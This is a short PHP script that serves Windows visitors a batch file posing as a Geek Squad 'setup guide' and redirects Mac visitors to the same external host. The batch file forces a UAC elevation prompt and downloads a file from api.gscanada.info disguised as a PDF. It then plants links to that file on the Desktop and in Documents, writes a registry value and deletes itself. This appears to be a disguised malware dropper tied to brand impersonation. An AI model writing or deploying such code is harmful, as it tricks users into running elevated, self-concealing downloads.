<?php
	
if (False != strpos($_SERVER['HTTP_USER_AGENT'], "Windows")) {
	header("Content-type: text/plain");	
	header("Content-Disposition: attachment; filename=setup_guide.bat");
	echo "@echo off\r\n";

	echo ">nul 2>&1 \"%SYSTEMROOT%\system32\cacls.exe\" \"%SYSTEMROOT%\system32\config\system\"
if '%ERRORLEVEL%' EQU '5' (
goto UACPrompt
) else ( goto gotAdmin )

:UACPrompt
echo Set UAC = CreateObject^(\"Shell.Application\"^) > \"%TEMP%\getadmin.vbs\"
echo UAC.ShellExecute \"%~s0\", \"\", \"\", \"runas\", 1 >> \"%TEMP%\getadmin.vbs\"
\"%TEMP%\getadmin.vbs\"
exit /B

:gotAdmin
if exist \"%TEMP%\getadmin.vbs\" ( del \"%TEMP%\getadmin.vbs\" )
pushd \"%CD%\"
cd /D \"%~dp0\"\r\n";

	echo "powershell.exe -Command \"& { (New-Object System.Net.WebClient).DownloadFile('https://api.gscanada.info/v1/afk3/leavebehind/Cg2Ss97tq6qH3Yxa4638/en/4/3/" . $_POST["bdg"] . "/1/" . $_POST["ag"] . "', " . '$env' . ":USERPROFILE + '\Geek Squad Setup Guide.pdf');}\"\r\n";
	echo "mklink \"%USERPROFILE%\Desktop\Geek Squad Setup Guide.pdf\" \"%USERPROFILE%\Geek Squad Setup Guide.pdf\" > NUL 2>&1\r\nmklink \"%USERPROFILE%\Documents\Geek Squad Setup Guide.pdf\" \"%USERPROFILE%\Geek Squad Setup Guide.pdf\" > NUL 2>&1\r\n";
	echo "REG ADD \"HKU\.DEFAULT\Software\SetID\"  /t REG_SZ /v \"activation\" /d \"" . $_POST["bdg"] . "\" /f  > NUL 2>&1\n";
	echo "START /b \"\" cmd /c DEL \"%~f0\" && EXIT\r\n";
	
}
if (False != strpos($_SERVER['HTTP_USER_AGENT'], "Macintosh")) {
	header('Location: https://api.gscanada.info/v1/afk3/leavebehind/Cg2Ss97tq6qH3Yxa4638/en/4/3/' . $_POST["bdg"] .'/1/' . $_POST["ag"]);
	die();
}
 ?>